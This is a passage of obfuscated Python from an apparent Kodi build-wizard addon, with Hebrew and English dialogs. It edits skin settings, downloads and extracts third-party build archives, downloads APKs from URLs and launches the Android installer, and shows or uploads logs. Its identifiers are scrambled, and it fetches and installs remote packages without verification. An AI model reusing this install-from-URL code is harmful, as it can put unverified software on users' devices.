			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4318
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4319
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4320
			O000OOO000OOOO0O0 .close ()#line:4321
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4325
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4327
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4328
			O000OOO000OOOO0O0 .close ()#line:4329
			OOOO0OOOO00O00OOO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4330
			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4331
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4332
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4333
			O000OOO000OOOO0O0 .close ()#line:4334
			OO00O00000O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4338
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'r')#line:4340
			OOO0O00O0000O0OO0 =O000OOO000OOOO0O0 .read ()#line:4341
			O000OOO000OOOO0O0 .close ()#line:4342
			OOOO0OOOO00O00OOO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4343
			O0000O0OO00O000OO =re .compile (OOOO0OOOO00O00OOO ).findall (OOO0O00O0000O0OO0 )[0 ]#line:4344
			O000OOO000OOOO0O0 =open (OO00O00000O0OO000 ,'w')#line:4345
			O000OOO000OOOO0O0 .write (OOO0O00O0000O0OO0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0000O0OO00O000OO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4346
			O000OOO000OOOO0O0 .close ()#line:4347
		except :#line:4352
			pass #line:4353
def thirdPartyInstall (OOO0OO0OO0OOOOO00 ,OOOOO0O0OO00OOOOO ):#line:4355
	if not wiz .workingURL (OOOOO0O0OO00OOOOO ):#line:4356
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4357
	O0O0O00000O0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0OO0OOOOO00 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4358
	if O0O0O00000O0O0O0O ==1 :#line:4359
		freshStart ('third',True )#line:4360
	wiz .clearS ('build')#line:4361
	OOOOOO0OOOO0OOOOO =OOO0OO0OO0OOOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4362
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4363
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OO0OOOOO00 ),'','אנא המתן')#line:4364
	O0OO00OOOOO00O0O0 =os .path .join (PACKAGES ,'%s.zip'%OOOOOO0OOOO0OOOOO )#line:4365
	try :os .remove (O0OO00OOOOO00O0O0 )#line:4366
	except :pass #line:4367
	downloader .download (OOOOO0O0OO00OOOOO ,O0OO00OOOOO00O0O0 ,DP )#line:4368
	xbmc .sleep (1000 )#line:4369
	O000OO00O0O00OO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OO0OOOOO00 )#line:4370
	DP .update (0 ,O000OO00O0O00OO0O ,'','אנא המתן')#line:4371
	O0OO0OO00O00O00OO ,OO0O0OO00000000O0 ,OOOO0O0O0O0O0O000 =extract .all (O0OO00OOOOO00O0O0 ,HOME ,DP ,title =O000OO00O0O00OO0O )#line:4372
	if int (float (O0OO0OO00O00O00OO ))>0 :#line:4373
		wiz .fixmetas ()#line:4374
		wiz .lookandFeelData ('save')#line:4375
		wiz .defaultSkin ()#line:4376
		wiz .setS ('installed','true')#line:4378
		wiz .setS ('extract',str (O0OO0OO00O00O00OO ))#line:4379
		wiz .setS ('errors',str (OO0O0OO00000000O0 ))#line:4380
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0OO00O00O00OO ,OO0O0OO00000000O0 ))#line:4381
		try :os .remove (O0OO00OOOOO00O0O0 )#line:4382
		except :pass #line:4383
		if int (float (OO0O0OO00000000O0 ))>0 :#line:4384
			O000OOOO00000O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OO0OOOOO00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO0OO00O00O00OO ,'%',COLOR1 ,OO0O0OO00000000O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4385
			if O000OOOO00000O000 :#line:4386
				if isinstance (OO0O0OO00000000O0 ,unicode ):#line:4387
					OOOO0O0O0O0O0O000 =OOOO0O0O0O0O0O000 .encode ('utf-8')#line:4388
				wiz .TextBox (ADDONTITLE ,OOOO0O0O0O0O0O000 )#line:4389
	DP .close ()#line:4390
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4391
	if INSTALLMETHOD ==1 :OOO0O0OOO0O0O0O0O =1 #line:4392
	elif INSTALLMETHOD ==2 :OOO0O0OOO0O0O0O0O =0 #line:4393
	else :OOO0O0OOO0O0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4394
	if OOO0O0OOO0O0O0O0O ==1 :wiz .reloadFix ()#line:4395
	else :wiz .killxbmc (True )#line:4396
def testTheme (O00OO0000OOOO0000 ):#line:4398
	OOO0000O0O00O00O0 =zipfile .ZipFile (O00OO0000OOOO0000 )#line:4399
	for OO000000O0O0OO0OO in OOO0000O0O00O00O0 .infolist ():#line:4400
		if '/settings.xml'in OO000000O0O0OO0OO .filename :#line:4401
			return True #line:4402
	return False #line:4403
def testGui (OOOO00000O000O000 ):#line:4405
	OO0OO000OO00OO0O0 =zipfile .ZipFile (OOOO00000O000O000 )#line:4406
	for O00OO000O00O00O00 in OO0OO000OO00OO0O0 .infolist ():#line:4407
		if '/guisettings.xml'in O00OO000O00O00O00 .filename :#line:4408
			return True #line:4409
	return False #line:4410
def apkInstaller (OOO000O0OOOO0O000 ,O00O0OOOOOO0O000O ):#line:4412
	wiz .log (OOO000O0OOOO0O000 )#line:4413
	wiz .log (O00O0OOOOOO0O000O )#line:4414
	if wiz .platform ()=='android':#line:4415
		O0OOOO00000OOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O0OOOO0O000 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4416
		if not O0OOOO00000OOOOOO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4417
		O0O000OOOO0OO0O00 =OOO000O0OOOO0O000 #line:4418
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4419
		if not wiz .workingURL (O00O0OOOOOO0O000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4420
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000OOOO0OO0O00 ),'','אנא המתן')#line:4421
		OO00O000000O000OO =os .path .join (PACKAGES ,"%s.apk"%OOO000O0OOOO0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4422
		try :os .remove (OO00O000000O000OO )#line:4423
		except :pass #line:4424
		downloader .download (O00O0OOOOOO0O000O ,OO00O000000O000OO ,DP )#line:4425
		xbmc .sleep (100 )#line:4426
		DP .close ()#line:4427
		notify .apkInstaller (OOO000O0OOOO0O000 )#line:4428
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO00O000000O000OO +'")')#line:4429
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4430
def createMenu (OOO00000O0OOO00O0 ,O0O0O0OOO00O000OO ,OOOOO0O0OOOOO0000 ):#line:4436
	if OOO00000O0OOO00O0 =='saveaddon':#line:4437
		O0O0O00OO00O00OO0 =[]#line:4438
		O00OO0000O00O00OO =urllib .quote_plus (O0O0O0OOO00O000OO .lower ().replace (' ',''))#line:4439
		OOO0O0OOOOOO0000O =O0O0O0OOO00O000OO .replace ('Debrid','Real Debrid')#line:4440
		OO0O000OOO00OO0O0 =urllib .quote_plus (OOOOO0O0OOOOO0000 .lower ().replace (' ',''))#line:4441
		OOOOO0O0OOOOO0000 =OOOOO0O0OOOOO0000 .replace ('url','URL Resolver')#line:4442
		O0O0O00OO00O00OO0 .append ((THEME2 %OOOOO0O0OOOOO0000 .title (),' '))#line:4443
		O0O0O00OO00O00OO0 .append ((THEME3 %'Save %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4444
		O0O0O00OO00O00OO0 .append ((THEME3 %'Restore %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4445
		O0O0O00OO00O00OO0 .append ((THEME3 %'Clear %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4446
	elif OOO00000O0OOO00O0 =='save':#line:4447
		O0O0O00OO00O00OO0 =[]#line:4448
		O00OO0000O00O00OO =urllib .quote_plus (O0O0O0OOO00O000OO .lower ().replace (' ',''))#line:4449
		OOO0O0OOOOOO0000O =O0O0O0OOO00O000OO .replace ('Debrid','Real Debrid')#line:4450
		OO0O000OOO00OO0O0 =urllib .quote_plus (OOOOO0O0OOOOO0000 .lower ().replace (' ',''))#line:4451
		OOOOO0O0OOOOO0000 =OOOOO0O0OOOOO0000 .replace ('url','URL Resolver')#line:4452
		O0O0O00OO00O00OO0 .append ((THEME2 %OOOOO0O0OOOOO0000 .title (),' '))#line:4453
		O0O0O00OO00O00OO0 .append ((THEME3 %'Register %s'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4454
		O0O0O00OO00O00OO0 .append ((THEME3 %'Save %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4455
		O0O0O00OO00O00OO0 .append ((THEME3 %'Restore %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4456
		O0O0O00OO00O00OO0 .append ((THEME3 %'Import %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4457
		O0O0O00OO00O00OO0 .append ((THEME3 %'Clear Addon %s Data'%OOO0O0OOOOOO0000O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00OO0000O00O00OO ,OO0O000OOO00OO0O0 )))#line:4458
	elif OOO00000O0OOO00O0 =='install':#line:4459
		O0O0O00OO00O00OO0 =[]#line:4460
		OO0O000OOO00OO0O0 =urllib .quote_plus (OOOOO0O0OOOOO0000 )#line:4461
		O0O0O00OO00O00OO0 .append ((THEME2 %OOOOO0O0OOOOO0000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0O000OOO00OO0O0 )))#line:4462
		O0O0O00OO00O00OO0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0O000OOO00OO0O0 )))#line:4463
		O0O0O00OO00O00OO0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0O000OOO00OO0O0 )))#line:4464
		O0O0O00OO00O00OO0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0O000OOO00OO0O0 )))#line:4465
		O0O0O00OO00O00OO0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0O000OOO00OO0O0 )))#line:4466
	O0O0O00OO00O00OO0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4467
	return O0O0O00OO00O00OO0 #line:4468
def toggleCache (OO0O0O0O00OO0O0O0 ):#line:4470
	O0O0O0O0OOOO00O00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4471
	OO000OOOOOOOOO0O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4472
	if OO0O0O0O00OO0O0O0 in ['true','false']:#line:4473
		for OOOOOOOOO0O0O000O in O0O0O0O0OOOO00O00 :#line:4474
			wiz .setS (OOOOOOOOO0O0O000O ,OO0O0O0O00OO0O0O0 )#line:4475
	else :#line:4476
		if not OO0O0O0O00OO0O0O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4477
			try :#line:4478
				OOOOOOOOO0O0O000O =OO000OOOOOOOOO0O0 [O0O0O0O0OOOO00O00 .index (OO0O0O0O00OO0O0O0 )]#line:4479
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOOOOOOOO0O0O000O ))#line:4480
			except :#line:4481
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O0O0O00OO0O0O0 ))#line:4482
		else :#line:4483
			O0OO00O0OOO000O00 ='true'if wiz .getS (OO0O0O0O00OO0O0O0 )=='false'else 'false'#line:4484
			wiz .setS (OO0O0O0O00OO0O0O0 ,O0OO00O0OOO000O00 )#line:4485
def playVideo (OOO000O0O00O0OO0O ):#line:4487
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOO000O0O00O0OO0O )#line:4488
	if 'watch?v='in OOO000O0O00O0OO0O :#line:4489
		OOO0OOOOO000OO00O ,OO000OO0O00O0O000 =OOO000O0O00O0OO0O .split ('?')#line:4490
		OO0O00000OO0OOO00 =OO000OO0O00O0O000 .split ('&')#line:4491
		for OO00O0OOO000O0OOO in OO0O00000OO0OOO00 :#line:4492
			if OO00O0OOO000O0OOO .startswith ('v='):#line:4493
				OOO000O0O00O0OO0O =OO00O0OOO000O0OOO [2 :]#line:4494
				break #line:4495
			else :continue #line:4496
	elif 'embed'in OOO000O0O00O0OO0O or 'youtu.be'in OOO000O0O00O0OO0O :#line:4497
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOO000O0O00O0OO0O )#line:4498
		OOO0OOOOO000OO00O =OOO000O0O00O0OO0O .split ('/')#line:4499
		if len (OOO0OOOOO000OO00O [-1 ])>5 :#line:4500
			OOO000O0O00O0OO0O =OOO0OOOOO000OO00O [-1 ]#line:4501
		elif len (OOO0OOOOO000OO00O [-2 ])>5 :#line:4502
			OOO000O0O00O0OO0O =OOO0OOOOO000OO00O [-2 ]#line:4503
	wiz .log ("YouTube URL: %s"%OOO000O0O00O0OO0O )#line:4504
	yt .PlayVideo (OOO000O0O00O0OO0O )#line:4505
def viewLogFile ():#line:4507
	OO0O000000OOOO0O0 =wiz .Grab_Log (True )#line:4508
	OOOO00O000OO0O00O =wiz .Grab_Log (True ,True )#line:4509
	OO00000OO0OO0O0O0 =0 ;O000O0O00OOO0OOOO =OO0O000000OOOO0O0 #line:4510
	if not OOOO00O000OO0O00O ==False and not OO0O000000OOOO0O0 ==False :#line:4511
		OO00000OO0OO0O0O0 =DIALOG .select (ADDONTITLE ,["View %s"%OO0O000000OOOO0O0 .replace (LOG ,""),"View %s"%OOOO00O000OO0O00O .replace (LOG ,"")])#line:4512
		if OO00000OO0OO0O0O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4513
	elif OO0O000000OOOO0O0 ==False and OOOO00O000OO0O00O ==False :#line:4514
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4515
		return #line:4516
	elif not OO0O000000OOOO0O0 ==False :OO00000OO0OO0O0O0 =0 #line:4517
	elif not OOOO00O000OO0O00O ==False :OO00000OO0OO0O0O0 =1 #line:4518
	O000O0O00OOO0OOOO =OO0O000000OOOO0O0 if OO00000OO0OO0O0O0 ==0 else OOOO00O000OO0O00O #line:4520
	OOO00O000O000O000 =wiz .Grab_Log (False )if OO00000OO0OO0O0O0 ==0 else wiz .Grab_Log (False ,True )#line:4521
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O000O0O00OOO0OOOO ),OOO00O000O000O000 )#line:4523
def errorChecking (log =None ,count =None ,all =None ):#line:4525
	if log ==None :#line:4526
		O000O0000O0OO000O =wiz .Grab_Log (True )#line:4527
		OO0000OOO00000O00 =wiz .Grab_Log (True ,True )#line:4528
		if not OO0000OOO00000O00 ==False and not O000O0000O0OO000O ==False :#line:4529
			OOOO0OO0OOOO0OO0O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000O0000O0OO000O .replace (LOG ,""),errorChecking (O000O0000O0OO000O ,True ,True )),"View %s: %s error(s)"%(OO0000OOO00000O00 .replace (LOG ,""),errorChecking (OO0000OOO00000O00 ,True ,True ))])#line:4530
			if OOOO0OO0OOOO0OO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4531
		elif O000O0000O0OO000O ==False and OO0000OOO00000O00 ==False :#line:4532
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4533
			return #line:4534
		elif not O000O0000O0OO000O ==False :OOOO0OO0OOOO0OO0O =0 #line:4535
		elif not OO0000OOO00000O00 ==False :OOOO0OO0OOOO0OO0O =1 #line:4536
		log =O000O0000O0OO000O if OOOO0OO0OOOO0OO0O ==0 else OO0000OOO00000O00 #line:4537
	if log ==False :#line:4538
		if count ==None :#line:4539
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4540
			return False #line:4541
		else :#line:4542
			return 0 #line:4543
	else :#line:4544
		if os .path .exists (log ):#line:4545
			O00OOO00000O0OO0O =open (log ,mode ='r');O0O00OO0OOOOOOO00 =O00OOO00000O0OO0O .read ().replace ('\n','').replace ('\r','');O00OOO00000O0OO0O .close ()#line:4546
			OOO0OOO0O00O0O0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0O00OO0OOOOOOO00 )#line:4547
			if not count ==None :#line:4548
				if all ==None :#line:4549
					OOO00OO000OO00O0O =0 #line:4550
					for OO00OO0OO00OOO0OO in OOO0OOO0O00O0O0O0 :#line:4551
						if ADDON_ID in OO00OO0OO00OOO0OO :OOO00OO000OO00O0O +=1 #line:4552
					return OOO00OO000OO00O0O #line:4553
				else :return len (OOO0OOO0O00O0O0O0 )#line:4554
			if len (OOO0OOO0O00O0O0O0 )>0 :#line:4555
				OOO00OO000OO00O0O =0 ;O0O0O00O00000O0OO =""#line:4556
				for OO00OO0OO00OOO0OO in OOO0OOO0O00O0O0O0 :#line:4557
					if all ==None and not ADDON_ID in OO00OO0OO00OOO0OO :continue #line:4558
					else :#line:4559
						OOO00OO000OO00O0O +=1 #line:4560
						O0O0O00O00000O0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO00OO000OO00O0O ,OO00OO0OO00OOO0OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4561
				if OOO00OO000OO00O0O >0 :#line:4562
					wiz .TextBox (ADDONTITLE ,O0O0O00O00000O0OO )#line:4563
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4564
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4565
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4566
ACTION_PREVIOUS_MENU =10 #line:4568
ACTION_NAV_BACK =92 #line:4569
ACTION_MOVE_LEFT =1 #line:4570
ACTION_MOVE_RIGHT =2 #line:4571
ACTION_MOVE_UP =3 #line:4572
ACTION_MOVE_DOWN =4 #line:4573
ACTION_MOUSE_WHEEL_UP =104 #line:4574
ACTION_MOUSE_WHEEL_DOWN =105 #line:4575
ACTION_MOVE_MOUSE =107 #line:4576
ACTION_SELECT_ITEM =7 #line:4577
ACTION_BACKSPACE =110 #line:4578
ACTION_MOUSE_LEFT_CLICK =100 #line:4579
ACTION_MOUSE_LONG_CLICK =108 #line:4580
def LogViewer (default =None ):#line:4582
	class OO00OO0000OO00O0O (xbmcgui .WindowXMLDialog ):#line:4583
		def __init__ (OOOOOO000OO0OO0OO ,*O0OOOOO000OOOOOOO ,**OOO0O0OO0000O0OO0 ):#line:4584
			OOOOOO000OO0OO0OO .default =OOO0O0OO0000O0OO0 ['default']#line:4585
		def onInit (O0OO0000OO0OOO00O ):#line:4587
			O0OO0000OO0OOO00O .title =101 #line:4588
			O0OO0000OO0OOO00O .msg =102 #line:4589
			O0OO0000OO0OOO00O .scrollbar =103 #line:4590
			O0OO0000OO0OOO00O .upload =201 #line:4591
			O0OO0000OO0OOO00O .kodi =202 #line:4592
			O0OO0000OO0OOO00O .kodiold =203 #line:4593
			O0OO0000OO0OOO00O .wizard =204 #line:4594
			O0OO0000OO0OOO00O .okbutton =205 #line:4595
			O000O0OO000000O0O =open (O0OO0000OO0OOO00O .default ,'r')#line:4596
			O0OO0000OO0OOO00O .logmsg =O000O0OO000000O0O .read ()#line:4597
			O000O0OO000000O0O .close ()#line:4598
			O0OO0000OO0OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO0000OO0OOO00O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4599
			O0OO0000OO0OOO00O .showdialog ()#line:4600
		def showdialog (O0O0OO000O0OOOO0O ):#line:4602
			O0O0OO000O0OOOO0O .getControl (O0O0OO000O0OOOO0O .title ).setLabel (O0O0OO000O0OOOO0O .titlemsg )#line:4603
			O0O0OO000O0OOOO0O .getControl (O0O0OO000O0OOOO0O .msg ).setText (wiz .highlightText (O0O0OO000O0OOOO0O .logmsg ))#line:4604
			O0O0OO000O0OOOO0O .setFocusId (O0O0OO000O0OOOO0O .scrollbar )#line:4605
		def onClick (OO00O0OOOOOO0O0O0 ,O000O0O0O0OOOOOOO ):#line:4607
			if O000O0O0O0OOOOOOO ==OO00O0OOOOOO0O0O0 .okbutton :OO00O0OOOOOO0O0O0 .close ()#line:4608
			elif O000O0O0O0OOOOOOO ==OO00O0OOOOOO0O0O0 .upload :OO00O0OOOOOO0O0O0 .close ();uploadLog .Main ()#line:4609
			elif O000O0O0O0OOOOOOO ==OO00O0OOOOOO0O0O0 .kodi :#line:4610
				OOO00O000OOO0OO00 =wiz .Grab_Log (False )#line:4611
				O0O00O00O0O0OO0OO =wiz .Grab_Log (True )#line:4612
				if OOO00O000OOO0OO00 ==False :#line:4613
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4614
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4615
				else :#line:4616
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00O00O0O0OO0OO .replace (LOG ,''))#line:4617
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .title ).setLabel (OO00O0OOOOOO0O0O0 .titlemsg )#line:4618
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText (wiz .highlightText (OOO00O000OOO0OO00 ))#line:4619
					OO00O0OOOOOO0O0O0 .setFocusId (OO00O0OOOOOO0O0O0 .scrollbar )#line:4620
			elif O000O0O0O0OOOOOOO ==OO00O0OOOOOO0O0O0 .kodiold :#line:4621
				OOO00O000OOO0OO00 =wiz .Grab_Log (False ,True )#line:4622
				O0O00O00O0O0OO0OO =wiz .Grab_Log (True ,True )#line:4623
				if OOO00O000OOO0OO00 ==False :#line:4624
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4625
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4626
				else :#line:4627
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00O00O0O0OO0OO .replace (LOG ,''))#line:4628
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .title ).setLabel (OO00O0OOOOOO0O0O0 .titlemsg )#line:4629
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText (wiz .highlightText (OOO00O000OOO0OO00 ))#line:4630
					OO00O0OOOOOO0O0O0 .setFocusId (OO00O0OOOOOO0O0O0 .scrollbar )#line:4631
			elif O000O0O0O0OOOOOOO ==OO00O0OOOOOO0O0O0 .wizard :#line:4632
				OOO00O000OOO0OO00 =wiz .Grab_Log (False ,False ,True )#line:4633
				O0O00O00O0O0OO0OO =wiz .Grab_Log (True ,False ,True )#line:4634
				if OOO00O000OOO0OO00 ==False :#line:4635
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4636
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4637
				else :#line:4638
					OO00O0OOOOOO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00O00O0O0OO0OO .replace (ADDONDATA ,''))#line:4639
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .title ).setLabel (OO00O0OOOOOO0O0O0 .titlemsg )#line:4640
					OO00O0OOOOOO0O0O0 .getControl (OO00O0OOOOOO0O0O0 .msg ).setText (wiz .highlightText (OOO00O000OOO0OO00 ))#line:4641
					OO00O0OOOOOO0O0O0 .setFocusId (OO00O0OOOOOO0O0O0 .scrollbar )#line:4642
		def onAction (OOO0O000O000O00OO ,OOO00OOO00000OOOO ):#line:4644
			if OOO00OOO00000OOOO ==ACTION_PREVIOUS_MENU :OOO0O000O000O00OO .close ()#line:4645
			elif OOO00OOO00000OOOO ==ACTION_NAV_BACK :OOO0O000O000O00OO .close ()#line:4646
	if default ==None :default =wiz .Grab_Log (True )#line:4647
	O0O0OOO0OOO000000 =OO00OO0000OO00O0O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4648
